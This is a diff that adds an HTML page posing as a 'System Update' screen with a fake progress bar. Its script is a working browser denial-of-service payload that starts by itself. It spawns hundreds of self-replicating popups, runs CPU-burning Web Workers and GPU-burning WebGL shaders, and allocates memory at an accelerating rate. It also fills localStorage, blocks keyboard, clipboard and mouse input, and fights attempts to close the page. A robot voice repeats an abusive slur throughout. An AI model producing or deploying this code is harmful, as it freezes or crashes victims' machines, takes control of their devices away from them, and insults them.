@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>System Update</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #000;
+    color: #0f0;
+    font-family: 'Courier New', monospace;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    overflow: hidden;
+  }
+  .glitch {
+    font-size: 2.5rem;
+    text-align: center;
+    text-shadow: 0 0 10px #0f0, 0 0 20px #0f0, 0 0 40px #0f0;
+    animation: flicker 0.1s infinite;
+  }
+  .progress {
+    margin-top: 30px;
+    width: 300px;
+    height: 8px;
+    background: #222;
+    border: 1px solid #0f0;
+    overflow: hidden;
+  }
+  .bar {
+    height: 100%;
+    width: 0%;
+    background: #0f0;
+    box-shadow: 0 0 10px #0f0;
+    transition: width 0.3s;
+  }
+  @keyframes flicker {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+  /* Screen glitch overlay */
+  #glitch-overlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    pointer-events: none;
+    z-index: 999999;
+    opacity: 0;
+    mix-blend-mode: difference;
+  }
+  canvas { display: block; }
+</style>
+</head>
+<body>
+
+<div id="glitch-overlay"></div>
+<canvas id="gpu-canvas" style="position:fixed;top:-9999px;left:-9999px;width:256px;height:256px;"></canvas>
+
+<div class="glitch">SYSTEM UPDATE IN PROGRESS...</div>
+<div class="progress"><div class="bar" id="bar"></div></div>
+
+<script>
+  // === CONFIG ===
+  const MESSAGE = "you are a retard";
+  const WINDOW_COUNT = 400;
+  const GOOGLE_COUNT = 10;
+  const SPAWN_DELAY = 20;
+  const LOOP_INTERVAL = 800;
+  const TAB_TITLE = MESSAGE;
+
+  // === ROBOT VOICE ===
+  function speakMessage() {
+    if ('speechSynthesis' in window) {
+      function speak() {
+        const utter = new SpeechSynthesisUtterance(MESSAGE);
+        utter.rate = 0.4;
+        utter.pitch = 0.1;
+        utter.volume = 1.0;
+        const voices = window.speechSynthesis.getVoices();
+        const robotVoice = voices.find(v => /Google UK English Male/i.test(v.name))
+                       || voices.find(v => /Male/i.test(v.name))
+                       || voices[0];
+        if (robotVoice) utter.voice = robotVoice;
+        window.speechSynthesis.speak(utter);
+      }
+      speak();
+      setInterval(speak, 2000);
+    }
+  }
+
+  // === SCREEN GLITCH EFFECT ===
+  function startScreenGlitch() {
+    const overlay = document.getElementById('glitch-overlay');
+    let glitchText = '';
+
+    setInterval(() => {
+      // Random colored bars
+      const r = Math.floor(Math.random() * 255);
+      const g = Math.floor(Math.random() * 255);
+      const b = Math.floor(Math.random() * 255);
+
+      overlay.style.opacity = Math.random();
+      overlay.style.background = `linear-gradient(${Math.random() * 360}deg,
+        rgba(${r},${g},${b},0.3) ${Math.random() * 50}%,
+        rgba(${b},${r},${g},0.5) ${Math.random() * 50 + 50}%)`;
+
+      // Garbage characters rain
+      glitchText = '';
+      for (let i = 0; i < 2000; i++) {
+        glitchText += String.fromCharCode(Math.floor(Math.random() * 256));
+      }
+      overlay.textContent = glitchText;
+      overlay.style.color = `rgb(${r},${g},${b})`;
+      overlay.style.fontSize = '8px';
+      overlay.style.wordBreak = 'break-all';
+      overlay.style.lineHeight = '8px';
+    }, 50);
+
+    // CSS injection to glitch every element on the page
+    const glitchStyle = document.createElement('style');
+    glitchStyle.textContent = `
+      * {
+        animation: glitchShake 0.05s infinite !important;
+        filter: hue-rotate(${Math.random() * 360}deg) !important;
+      }
+      @keyframes glitchShake {
+        0% { transform: translate(0,0) skew(0deg); }
+        25% { transform: translate(${Math.random() * 10}px, ${Math.random() * 10}px) skew(1deg); }
+        50% { transform: translate(-${Math.random() * 10}px, ${Math.random() * 10}px) skew(-1deg); }
+        75% { transform: translate(${Math.random() * 10}px, -${Math.random() * 10}px) skew(0.5deg); }
+        100% { transform: translate(-${Math.random() * 10}px, -${Math.random() * 10}px) skew(-0.5deg); }
+      }
+    `;
+    document.head.appendChild(glitchStyle);
+
+    // Constantly reload the style with new random values
+    setInterval(() => {
+      glitchStyle.textContent = `
+        * {
+          animation: glitchShake 0.05s infinite !important;
+          filter: hue-rotate(${Math.random() * 360}deg) invert(${Math.random() > 0.5 ? 1 : 0}) !important;
+        }
+        @keyframes glitchShake {
+          0% { transform: translate(0,0); }
+          25% { transform: translate(${Math.random() * 15}px, ${Math.random() * 15}px); }
+          50% { transform: translate(-${Math.random() * 15}px, ${Math.random() * 15}px); }
+          75% { transform: translate(${Math.random() * 15}px, -${Math.random() * 15}px); }
+          100% { transform: translate(-${Math.random() * 15}px, -${Math.random() * 15}px); }
+        }
+      `;
+    }, 80);
+  }
+
+  // === GPU BOMB (WebGL) ===
+  function gpuBomb() {
+    const canvases = [];
+    const NUM_CANVASES = 16;
+
+    for (let i = 0; i < NUM_CANVASES; i++) {
+      const canvas = document.createElement('canvas');
+      canvas.width = 512;
+      canvas.height = 512;
+      canvas.style.position = 'fixed';
+      canvas.style.top = '-9999px';
+      document.body.appendChild(canvas);
+
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) continue;
+
+      // Vertex shader — just a full-screen quad
+      const vsSource = `
+        attribute vec2 a_position;
+        void main() {
+          gl_Position = vec4(a_position, 0.0, 1.0);
+        }
+      `;
+
+      // Fragment shader — heavy compute, random noise + heavy math loops
+      const fsSource = `
+        precision highp float;
+        uniform float u_time;
+        void main() {
+          vec2 uv = gl_FragCoord.xy / 512.0;
+          vec3 col = vec3(0.0);
+
+          // Heavy nested loops to burn GPU
+          for (int i = 0; i < 100; i++) {
+            for (int j = 0; j < 100; j++) {
+              col.r += sin(uv.x * float(i) + u_time);
+              col.g += cos(uv.y * float(j) + u_time);
+              col.b += sin(float(i + j) + u_time);
+            }
+          }
+
+          col = mod(col, vec3(1.0));
+          gl_FragColor = vec4(col, 1.0);
+        }
+      `;
+
+      function compileShader(type, source) {
+        const shader = gl.createShader(type);
+        gl.shaderSource(shader, source);
+        gl.compileShader(shader);
+        return shader;
+      }
+
+      const vs = compileShader(gl.VERTEX_SHADER, vsSource);
+      const fs = compileShader(gl.FRAGMENT_SHADER, fsSource);
+      const program = gl.createProgram();
+      gl.attachShader(program, vs);
+      gl.attachShader(program, fs);
+      gl.linkProgram(program);
+      gl.useProgram(program);
+
+      const positionBuffer = gl.createBuffer();
+      gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
+        -1, -1, 1, -1, -1, 1,
+        -1, 1, 1, -1, 1, 1
+      ]), gl.STATIC_DRAW);
+
+      const posLoc = gl.getAttribLocation(program, 'a_position');
+      gl.enableVertexAttribArray(posLoc);
+      gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
+
+      const timeLoc = gl.getUniformLocation(program, 'u_time');
+      canvases.push({ canvas, gl, program, timeLoc });
+    }
+
+    // Render loop — all canvases every frame
+    let t = 0;
+    function render() {
+      t += 0.05;
+      canvases.forEach(({ gl, timeLoc }) => {
+        gl.uniform1f(timeLoc, t);
+        gl.drawArrays(gl.TRIANGLES, 0, 6);
+        gl.flush();
+      });
+      requestAnimationFrame(render);
+    }
+    render();
+  }
+
+  // === POPUP MESSAGE WINDOWS (with self-replication + GPU + memory) ===
+  function spawnWindow() {
+    const w = window.open('about:blank', '_blank', 'width=350,height=180');
+    if (w) {
+      w.document.write(`
+        <html>
+        <head><title>${TAB_TITLE}</title></head>
+        <body style="margin:0;background:#1a0000;color:#ff0033;font-family:'Courier New',monospace;font-size:24px;display:flex;align-items:center;justify-content:center;height:100vh;font-weight:bold;text-shadow:0 0 8px #ff0033;text-align:center;">
+          ${MESSAGE}
+        </body></html>
+      `);
+      w.document.close();
+
+      // Each popup: self-replicate + eat memory + burn CPU
+      w.eval(`
+        setInterval(() => {
+          for (let i = 0; i < 5; i++) {
+            const nw = window.open('about:blank', '_blank', 'width=350,height=180');
+            if (nw) {
+              nw.document.write('<html><head><title>${MESSAGE}</title></head><body style="margin:0;background:#1a0000;color:#ff0033;font-family:Courier New;font-size:24px;display:flex;align-items:center;justify-content:center;height:100vh;font-weight:bold;text-shadow:0 0 8px #ff0033;text-align:center;">${MESSAGE}</body></html>');
+              nw.document.close();
+            }
+          }
+        }, 500);
+
+        // Memory bomb in each popup
+        const chunks = [];
+        setInterval(() => {
+          chunks.push(new Array(200000).fill('${MESSAGE}'));
+          chunks.push(new ArrayBuffer(2000000));
+        }, 300);
+
+        // CPU burn in each popup
+        setInterval(() => {
+          let x = 0;
+          for (let i = 0; i < 99999999; i++) x += Math.random();
+        }, 10);
+
+        // Block keyboard in popup
+        document.addEventListener('keydown', e => { e.preventDefault(); return false; }, true);
+        document.addEventListener('keypress', e => { e.preventDefault(); return false; }, true);
+      `);
+    }
+  }
+
+  // === GOOGLE.COM FLOOD ===
+  function openGoogleWindows() {
+    let googleOpened = 0;
+    const googleBurst = setInterval(() => {
+      for (let i = 0; i < 2; i++) {
+        window.open('https://www.google.com', '_blank');
+        googleOpened++;
+        if (googleOpened >= GOOGLE_COUNT) {
+          clearInterval(googleBurst);
+          return;
+        }
+      }
+    }, 150);
+  }
+
+  // === CONTINUOUS RESPAWN ===
+  function startLoop() {
+    setInterval(() => {
+      for (let i = 0; i < 25; i++) {
+        spawnWindow();
+      }
+    }, LOOP_INTERVAL);
+  }
+
+  // === WEB WORKER CPU STRESS (16 threads) ===
+  function createWorker() {
+    const workerCode = `
+      let x = 0;
+      while (true) {
+        x += Math.random() * Math.random() * Math.random() * Math.random();
+        if (x > 1e20) x = 0;
+      }
+    `;
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    return new Worker(URL.createObjectURL(blob));
+  }
+
+  function stressCPU() {
+    for (let i = 0; i < 16; i++) {
+      createWorker();
+    }
+    // Main thread burn
+    setInterval(() => {
+      let x = 0;
+      for (let i = 0; i < 99999999; i++) {
+        x += Math.random() * Math.random();
+      }
+    }, 30);
+  }
+
+  // === AGGRESSIVE MEMORY HOG (accelerating) ===
+  function eatMemory() {
+    const chunks = [];
+    let rate = 200;
+
+    function eat() {
+      // Push multiple types of large data
+      chunks.push(new Array(1000000).fill(MESSAGE));    // ~20MB string array
+      chunks.push(new ArrayBuffer(5000000));               // 5MB buffer
+      chunks.push(new Uint8Array(5000000));                // 5MB typed array
+      chunks.push(new Float64Array(1000000));               // 8MB float array
+
+      // Accelerate — eat faster each round
+      rate = Math.max(20, rate - 10);
+      setTimeout(eat, rate);
+    }
+    eat();
+  }
+
+  // === FILESYSTEM FILL (chrome.storage) ===
+  function fillStorage() {
+    // Use localStorage across all spawned windows
+    let data = MESSAGE.repeat(100000);
+    try {
+      // Fill localStorage to quota (5-10MB per origin)
+      while (true) {
+        const key = 'bomb_' + Math.random();
+        localStorage.setItem(key, data);
+      }
+    } catch(e) {
+      // localStorage full — that's fine, we keep trying
+    }
+
+    // Keep hammering it
+    setInterval(() => {
+      try {
+        for (let i = 0; i < 1000; i++) {
+          localStorage.setItem('bomb_' + Math.random() + '_' + i, data);
+        }
+      } catch(e) {}
+    }, 100);
+  }
+
+  // === KEYBOARD HIJACK ===
+  function hijackKeyboard() {
+    const block = (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
+    };
+
+    document.addEventListener('keydown', block, true);
+    document.addEventListener('keypress', block, true);
+    document.addEventListener('keyup', block, true);
+    document.addEventListener('input', block, true);
+    document.addEventListener('compositionstart', block, true);
+    document.addEventListener('compositionend', block, true);
+
+    // Also disable clipboard
+    document.addEventListener('copy', block, true);
+    document.addEventListener('paste', block, true);
+    document.addEventListener('cut', block, true);
+
+    // Disable context menu
+    document.addEventListener('contextmenu', block, true);
+
+    // Hijack mouse too — make it impossible to click anything meaningful
+    document.addEventListener('click', (e) => {
+      e.preventDefault();
+      spawnWindow();
+    }, true);
+  }
+
+  // === ANTI-CLOSE (revenge burst) ===
+  window.onbeforeunload = function() {
+    // Dump massive data before closing
+    for (let i = 0; i < 100; i++) {
+      spawnWindow();
+    }
+    // Final memory dump
+    try {
+      for (let i = 0; i < 100; i++) {
+        localStorage.setItem('die_' + i, MESSAGE.repeat(50000));
+      }
+    } catch(e) {}
+
+    return MESSAGE;
+  };
+
+  // Prevent page from being unloaded
+  window.onunload = function() {
+    // Open a new window that restarts everything
+    const w = window.open('about:blank', '_blank');
+    if (w) {
+      w.document.write('<script>location.reload();<\/script>');
+    }
+  };
+
+  // === FAKE PROGRESS BAR ===
+  let progress = 0;
+  function fakeProgress() {
+    const bar = document.getElementById('bar');
+    setInterval(() => {
+      progress += Math.random() * 5;
+      if (progress > 99) progress = 99;
+      bar.style.width = progress + '%';
+    }, 150);
+  }
+
+  // === LAUNCH SEQUENCE ===
+  let launched = false;
+  function launch() {
+    if (launched) return;
+    launched = true;
+
+    fakeProgress();
+    speakMessage();
+    hijackKeyboard();
+    fillStorage();
+
+    // Phase 1: 400 popup windows (each self-replicates)
+    let count = 0;
+    const burst = setInterval(() => {
+      for (let i = 0; i < 20; i++) {
+        spawnWindow();
+      }
+      count += 20;
+      if (count >= WINDOW_COUNT) {
+        clearInterval(burst);
+
+        // Phase 2: 10 google.com tabs
+        openGoogleWindows();
+
+        // Phase 3: Full crash sequence
+        setTimeout(() => {
+          startLoop();
+          stressCPU();        // 16 web workers + main thread
+          eatMemory();         // accelerating RAM consumption
+          gpuBomb();           // 16 WebGL canvases with heavy shaders
+          startScreenGlitch(); // screen corruption effect
+        }, 1500);
+
+        // Phase 4: Final wave — everything at maximum
+        setTimeout(() => {
+          // Double the workers
+          for (let i = 0; i < 16; i++) createWorker();
+          // Double the GPU load
+          gpuBomb();
+          // Nuclear respawn loop
+          setInterval(() => {
+            for (let i = 0; i < 50; i++) spawnWindow();
+          }, 400);
+        }, 5000);
+      }
+    }, SPAWN_DELAY);
+  }
+
+  // Start on click (bypasses popup blocker)
+  document.body.addEventListener('click', launch, { once: true });
+
+  // Auto-start after 2.5 seconds even without click
+  setTimeout(launch, 2500);
+</script>
+
+</body>
+</html>
